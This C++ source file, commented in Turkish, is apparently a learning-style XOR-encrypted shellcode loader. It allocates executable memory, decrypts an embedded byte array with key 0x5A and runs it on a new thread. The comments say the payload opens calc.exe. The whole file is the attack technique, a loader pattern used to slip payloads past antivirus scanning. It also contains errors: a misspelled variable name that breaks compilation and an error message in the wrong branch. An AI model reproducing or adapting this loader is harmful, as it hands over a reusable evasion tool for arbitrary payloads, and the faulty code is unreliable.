#include <iostream>
#include <windows.h> //win32 api kütüphanesi
#include <TlHelp32.h> //windowsta çalışan process ve thread'leri listelemek için kullanılır. birazdan snapshot alacağım.
#include <clocale> 

using namespace std;

//Kullanacağım fonksiyonları önden tanımlıyorum.
void EncryptedShellCodeRunner();

int main()
{
  setlocale(LC_ALL, "Turkish"); //konsolu türkçe karakterlere uygun hale getirir. debug aşaması için faydalı.
  EncryptedShellCodeRunner();
}

void EncryptedShellCodeRunner()
{
  unsigned char key = 0x5A; //XOR anahtarı

  // 2. XOR (0x5A) ile önceden şifrelenmiş calc.exe baytları
  unsigned char encryptedShellCode[] = {
	  0x0A, 0x0B, 0x08, 0x09, 0x0C, 0x0D, 0x0F, 0x30, 0x3A, 0x00, 0x32, 0x39,
	  0x3B, 0x36, 0x39, 0x0E, 0x03, 0x12, 0xD9, 0xB6, 0x72, 0x3F, 0x12, 0xD1,
	  0x68, 0x12, 0xD1, 0x2C, 0x42, 0x12, 0xD1, 0x2C, 0x4A, 0x12, 0xF7, 0x12,
	  0xD1, 0x6A, 0x12, 0xD1, 0x24, 0x6A, 0x59, 0x0D, 0x66, 0xD1, 0x06, 0x4D,
	  0x72, 0xD1, 0x2E, 0x45, 0x7A, 0x12, 0x5B, 0xA4, 0xD1, 0x0E, 0x45, 0x7E,
	  0x55, 0xED, 0x76, 0x4D, 0xD7, 0x08, 0x58, 0xF7, 0xDB, 0x66, 0x5D, 0x0D,
	  0x33, 0x34, 0x1F, 0x2F, 0xB5, 0xD1, 0x2E, 0x45, 0x46, 0x12, 0x5B, 0xA4,
	  0xD1, 0x6E, 0xF4, 0x12, 0x5B, 0xAD, 0xC3, 0xA5, 0x8D, 0x12, 0xD9, 0x9E,
	  0x6A, 0x07, 0x05, 0x04, 0x01, 0x00, 0x03, 0x02, 0x99
  };

  SIZE_T codeSize = sizeof(encryptedShellCode);

  // 3. RAM'de yer tahsis et
  LPVOID execBuffer = VirtualAlloc(NULL, codeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

  if(execBuffer != NULL)
  {
    cout << "Bellekte alan ayrıldı: " << execBuffer << endl;

    // 4. Adım: Şifreli baytları RAM'e kopyala
    memcpy(execBuffer, encryptedShellcode, codeSize);
    cout << "Şifreli baytlar RAM'e kopyalandı." << endl;

    // 5. Adım (KRİTİK): RAM içindeki baytları tek tek XOR ile çöz
    unsigned char* pBuffer = (unsigned char*)execBuffer;
    for(size_t i=0; i < codeSize; i++)
      {
        pBuffer[i] ^= key; //XOR çözme işlemi
      }
    cout << "Decryption tamamlandı!" << endl;

    // 6. Adım: Çözülen orijinal baytları çalıştır
    HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)execBuffer, NULL, 0, NULL);
    if(hThread != NULL)
    {
      cout << "Thread başlatıldı, hesap makinesi açılıyor." << endl;
      WaitForSingleObject(hThread, INFINITE);
      CloseHandle(hThread);
    } else {
      cout << "HATA: Bellekte alan ayrılamadı. Hata Kodu: " << GetLastError() << endl;
    }
      
  }
  
}
